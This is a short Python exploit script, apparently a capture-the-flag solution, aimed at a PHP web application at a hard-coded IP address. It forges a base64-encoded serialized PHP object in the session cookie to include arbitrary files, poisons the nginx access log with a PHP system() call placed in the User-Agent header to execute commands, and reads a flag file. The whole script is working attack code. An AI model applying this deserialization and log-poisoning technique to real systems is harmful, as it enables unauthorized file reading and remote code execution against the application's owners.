#!/usr/bin/python3

from asyncore import read
from http import cookies
import requests
import base64

def toxic(url, payload):

    payload_len = len(payload)
    cookie = 'O:9:"PageModel":1:{s:4:"file";s:' + str(payload_len) + ':"' + payload + '";}'
    print(cookie)
    cookie_byte = cookie.encode('ascii')
    cookie_b64 = base64.b64encode(cookie_byte)
    cookie_string = cookie_b64.decode("ascii")
    print(cookie_string)

    headers = {
        "User-Agent": "<?php system('ls /');?>"
    }

    cookies = {
        "PHPSESSID": cookie_string,
    }

    r = requests.get(url, headers=headers, cookies=cookies)
    print(r.status_code)
    print(r.text)

def read_flag(url, flag):

    payload_len = len(flag)
    cookie = 'O:9:"PageModel":1:{s:4:"file";s:' + str(payload_len) + ':"' + flag + '";}'
    print(cookie)
    cookie_byte = cookie.encode('ascii')
    cookie_b64 = base64.b64encode(cookie_byte)
    cookie_string = cookie_b64.decode("ascii")
    print(cookie_string)

    cookies = {
        "PHPSESSID": cookie_string,
    }

    r = requests.get(url, cookies=cookies)
    print(r.status_code)
    print(r.text)

if __name__ == '__main__':
    url = 'http://142.93.39.44:31492/'
    payload = "/var/log/nginx/access.log"
    flag = "/flag_rzxYW"

    #toxic(url, payload)
    read_flag(url, flag)